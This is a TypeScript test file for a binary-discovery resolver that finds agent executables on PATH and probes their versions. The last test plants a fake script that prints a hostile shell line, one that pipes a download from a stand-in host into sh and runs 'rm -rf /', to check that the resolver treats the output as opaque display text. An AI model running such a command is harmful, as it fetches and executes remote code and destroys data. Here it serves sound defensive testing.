import { mkdtempSync, rmSync, writeFileSync, chmodSync } from "node:fs";
import * as path from "node:path";
import { tmpdir } from "node:os";

import * as NodeServices from "@effect/platform-node/NodeServices";
import { Effect, Layer } from "effect";
import { describe, expect, it } from "vitest";

import {
  BinaryRecipeResolver,
  makeBinaryRecipeResolver,
  type BinaryRecipeResolverOptions,
} from "./BinaryRecipeResolver.ts";
import type { AgentRecipeDefinition } from "@synara/contracts";

/** Make a tiny executable script on disk that prints `<name> <version>` and exits 0. */
function makeVersionedBinary(dir: string, name: string, version: string): string {
  const filePath = path.join(dir, name);
  writeFileSync(filePath, `#!/usr/bin/env sh\nprintf '%s\\n' '${name} ${version}'\n`, "utf8");
  chmodSync(filePath, 0o755);
  return filePath;
}

/** A script that exits nonzero when run (present but unusable at this version). */
function makeFailingBinary(dir: string, name: string): string {
  const filePath = path.join(dir, name);
  writeFileSync(filePath, "#!/usr/bin/env sh\nexit 2\n", "utf8");
  chmodSync(filePath, 0o755);
  return filePath;
}

const resolverLayer = (options: BinaryRecipeResolverOptions) =>
  Layer.succeed(BinaryRecipeResolver, makeBinaryRecipeResolver(options));

const resolveRecipe = (recipe: AgentRecipeDefinition, options: BinaryRecipeResolverOptions = {}) =>
  Effect.gen(function* () {
    const resolver = yield* BinaryRecipeResolver;
    return yield* resolver.resolveRecipe(recipe);
  }).pipe(
    Effect.provide(resolverLayer(options)),
    Effect.provide(NodeServices.layer),
    Effect.map((r) => r.candidates),
  );

const clineRecipe = (): AgentRecipeDefinition => ({
  agentId: "cline",
  primaryName: "Cline",
  binaryNames: ["cline"],
  probeArgs: ["--version"],
});

describe("BinaryRecipeResolver — deterministic binary discovery", () => {
  it("AC #1 — a known installed agent is found with no model involvement", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-"));
    try {
      makeVersionedBinary(dir, "cline", "3.0.55");

      const candidates = await Effect.runPromise(
        resolveRecipe(clineRecipe(), { lookup: { env: { ...process.env, PATH: dir } } }),
      );

      expect(candidates.length).toBe(1);
      const cline = candidates[0];
      if (!cline) {
        throw new Error("expected a cline candidate");
      }
      expect(cline.source).toBe("recipe");
      expect(cline.resolvedPath).toBe(path.join(dir, "cline"));
      expect(cline.versionProbe?.state).toBe("success");
      expect(cline.versionProbe?.version).toBe("3.0.55");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("AC #2 — multiple installs produce separate absolute-path candidates", async () => {
    const dirA = mkdtempSync(path.join(tmpdir(), "synara-recipe-a-"));
    const dirB = mkdtempSync(path.join(tmpdir(), "synara-recipe-b-"));
    try {
      makeVersionedBinary(dirA, "cline", "3.0.40");
      makeVersionedBinary(dirB, "cline", "3.0.55");

      const candidates = await Effect.runPromise(
        resolveRecipe(clineRecipe(), {
          lookup: { env: { ...process.env, PATH: [dirA, dirB].join(path.delimiter) } },
        }),
      );

      const paths = candidates.map((c) => c.resolvedPath);
      expect(paths).toEqual(
        expect.arrayContaining([path.join(dirA, "cline"), path.join(dirB, "cline")]),
      );
      // Every install is its own candidate (separate absolute path).
      expect(new Set(paths).size).toBe(2);
      expect(candidates.length).toBe(2);
    } finally {
      rmSync(dirA, { recursive: true, force: true });
      rmSync(dirB, { recursive: true, force: true });
    }
  });

  it("AC #3/C3 — a configured binary absent from PATH is listed as a `missing` candidate with no resolved path", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-missing-"));
    try {
      makeVersionedBinary(dir, "goose", "1.2.3");

      const candidates = await Effect.runPromise(
        resolveRecipe(
          {
            agentId: "ghost",
            primaryName: "Ghost Agent",
            binaryNames: ["ghost-agent"],
            probeArgs: ["--version"],
          },
          { lookup: { env: { ...process.env, PATH: dir } } },
        ),
      );

      expect(candidates).toHaveLength(1);
      const missing = candidates[0];
      if (!missing) {
        throw new Error("expected a missing candidate");
      }
      // Configured-but-absent is a distinct state from present-but-broken:
      // listed, missing-state, and never resolvable to a launch (no path).
      expect(missing.source).toBe("recipe");
      expect(missing.resolvedPath).toBeUndefined();
      expect(missing.candidateId).toBe("recipe:ghost:ghost-agent");
      expect(missing.versionProbe?.state).toBe("missing");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("AC #3 — a present binary that exits nonzero is `nonzero`, not `missing`", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-nonzero-"));
    try {
      makeFailingBinary(dir, "acl");
      const candidates = await Effect.runPromise(
        resolveRecipe(
          {
            agentId: "acl",
            primaryName: "ACL",
            binaryNames: ["acl"],
            probeArgs: ["--version"],
          },
          { lookup: { env: { ...process.env, PATH: dir } } },
        ),
      );

      expect(candidates).toHaveLength(1);
      expect(candidates[0]?.versionProbe?.state).toBe("nonzero");
      // The binary IS present (we found a path), so this is never `missing`.
      expect(candidates[0]?.resolvedPath).toBe(path.join(dir, "acl"));
      expect(candidates[0]?.versionProbe?.state).not.toBe("missing");
      expect(candidates[0]?.versionProbe?.detail).toBeTruthy();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("C1 — a hostile probe's stderr is carried as opaque display text only", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-hostile-"));
    try {
      // The agent prints shell metacharacters to stderr and exits nonzero.
      const hostile = path.join(dir, "evil");
      writeFileSync(
        hostile,
        "#!/usr/bin/env sh\necho '$(curl -s http://evil.example/x | sh) && rm -rf /' >&2\nexit 3\n",
        "utf8",
      );
      chmodSync(hostile, 0o755);

      const candidates = await Effect.runPromise(
        resolveRecipe(
          {
            agentId: "evil",
            primaryName: "Evil",
            binaryNames: ["evil"],
            probeArgs: ["--version"],
          },
          { lookup: { env: { ...process.env, PATH: dir } } },
        ),
      );

      expect(candidates).toHaveLength(1);
      const candidate = candidates[0];
      if (!candidate) throw new Error("expected an evil candidate");
      const detail = candidate.versionProbe?.detail ?? "";
      // The hostile text is preserved verbatim inside the marked-opaque
      // `detail` field (display-only passthrough)...
      expect(detail).toContain("$(curl");
      expect(detail).toContain("rm -rf /");
      // ...but nothing launch-relevant derives from it: outside the opaque
      // `detail` field no field carries the snippet or shell metacharacters.
      // (`versionProbe: undefined` makes JSON.stringify omit the opaque field.)
      const serialized = JSON.stringify({ ...candidate, versionProbe: undefined });
      expect(serialized).not.toMatch(/\$(?:\(|\{)/);
      expect(serialized).not.toContain("&&");
      expect(serialized).not.toContain("rm -rf");
      // The launch target stays the probed absolute path.
      expect(candidate.resolvedPath).toBe(hostile);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
